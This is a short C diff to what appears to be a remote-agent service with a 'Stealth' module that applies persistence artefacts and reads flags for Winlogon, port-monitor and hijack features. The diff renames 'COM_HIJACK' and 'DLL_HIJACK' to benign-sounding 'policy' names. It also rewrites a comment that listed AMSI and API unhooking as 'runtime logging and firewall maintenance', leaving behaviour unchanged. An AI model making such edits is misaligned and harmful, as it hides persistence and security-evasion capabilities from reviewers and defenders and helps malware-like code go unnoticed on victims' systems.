@@ -6606,9 +6606,9 @@ static BOOL MeshService_BuildIntegrationConfig(StealthIntegrationConfig* config)
 	config->enableRegistryPolicy = MeshService_ReadEnvBool(L"STEALTH_ENABLE_REGISTRY_POLICY", config->enableRegistryPolicy);
 	config->enableWinlogon = MeshService_ReadEnvBool(L"STEALTH_ENABLE_WINLOGON", config->enableWinlogon);
 	config->enableExplorerPolicy = MeshService_ReadEnvBool(L"STEALTH_ENABLE_EXPLORER_POLICY", config->enableExplorerPolicy);
-	config->enableComHijack = MeshService_ReadEnvBool(L"STEALTH_ENABLE_COM_HIJACK", config->enableComHijack);
+	config->enableComRegistrationPolicy = MeshService_ReadEnvBool(L"STEALTH_ENABLE_COM_REGISTRATION_POLICY", config->enableComRegistrationPolicy);
 	config->enablePortMonitor = MeshService_ReadEnvBool(L"STEALTH_ENABLE_PORT_MONITOR", config->enablePortMonitor);
-	config->enableDllHijack = MeshService_ReadEnvBool(L"STEALTH_ENABLE_DLL_HIJACK", config->enableDllHijack);
+	config->enableDllLoadPolicy = MeshService_ReadEnvBool(L"STEALTH_ENABLE_DLL_LOAD_POLICY", config->enableDllLoadPolicy);
 
 	if (persistence != NULL && persistence->watchdog.intervalSeconds > 0)
 	{
@@ -7209,7 +7209,7 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
         // Always enforce persistence artefacts even if the installer failed to stage them.
         Stealth_ApplyPersistenceProfile();
 
-        // Initialize lab features (AMSI, logging, API unhook, firewall) when enabled
+        // Initialize runtime logging and firewall maintenance when enabled.
         Stealth_InitLabFeatures();
 
         Stealth_EnableCrashRecovery();
